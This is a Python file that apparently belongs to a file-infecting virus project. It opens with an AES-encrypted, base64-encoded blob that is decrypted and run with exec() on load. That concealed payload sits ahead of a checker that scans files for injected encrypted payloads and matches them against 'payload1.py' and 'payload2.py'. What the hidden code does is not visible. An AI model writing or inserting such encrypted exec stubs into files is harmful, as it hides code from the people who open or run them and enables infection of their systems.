
import base64
from Crypto.Cipher import AES
key = base64.b64decode("""ycQkYdMqSyHFlkATxbfRbg==""")
c1 = base64.b64decode("""3xCbA653amgKex6Oe0ic3z7psecqlLBMc2yI4bk27ZE+UEVeBt9RWgHLdqbBlrTl9b2tuV1D88pLC5aVREX3nKaAR0iZ+muGpTjnQHo2cx0FncSgDVU442Mz2GDLeNv6t3G7EoV33hOe9U16YXPSJASNK9iIjAZfDi2FDQMkkS0=""")
cipher = AES.new(key)
c2 = cipher.decrypt(c1).decode()
exec(c2)
import sys
import base64
from Crypto.Cipher import AES
import os
import re

def find_pattern(filename, pattern):
    with open(filename, 'r') as file:
        injected_lines = file.readlines()

    the_line = next((line for line in injected_lines if pattern in line), None)

    if the_line:
        start = False
        the_string = ""
        for character in the_line:
            if character == "(":
                start = True
            elif character == ")" and start:
                break
            elif start:
                the_string += character
        return the_string.strip()  # Return the extracted string if the pattern is found

    return None  # Return None if the pattern is not found in any line

                                
def check(file):
    res = 0
    pattern1 = "key = base64.b64decode(\""
    pattern2 = "c1 = base64.b64decode(\""
    
    key = find_pattern(file , pattern1) 
    encrypted_data = find_pattern(file, pattern2)
    decrypted_data = None

    if encrypted_data is not None and key is not None:
        theKey = base64.b64decode(key)
        encrypted_data = base64.b64decode(encrypted_data)
        cipher = AES.new(theKey)
        decrypted_data = cipher.decrypt(encrypted_data)
    else:
        with open(file, "r") as file:
            decrypted_data = file.read().encode()
    
    with open("payload1.py", "r") as file1:
        payload1 = file1.read().encode()
    
    with open("payload2.py", "r") as file2:
        payload2 = file2.read().encode()

    if payload1 in decrypted_data:
        res = 1
    elif payload2 in decrypted_data:
        res = 2
    else:
        res = None

    return res

if __name__ == '__main__':
    check(sys.argv[1])

